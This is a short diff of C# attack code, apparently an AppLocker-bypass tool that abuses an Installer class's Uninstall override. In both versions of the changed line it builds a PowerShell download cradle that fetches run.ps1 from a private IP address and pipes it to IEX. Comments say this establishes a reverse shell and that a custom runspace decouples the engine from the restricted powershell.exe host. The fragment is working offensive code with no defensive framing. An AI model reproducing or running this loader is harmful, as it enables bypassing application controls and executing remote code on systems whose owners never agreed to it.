@@ -26,7 +26,7 @@ namespace Bypass {
     public class Sample : System.Configuration.Install.Installer {
         public override void Uninstall(System.Collections.IDictionary savedState) {
             // 1. Define the command to establish the final reverse shell
-            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.147/run.ps1') | IEX";
+            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.147/PS/run.ps1') | IEX";
             
             // 2. Create a custom runspace
             // This decouples the engine from the restricted powershell.exe host, 
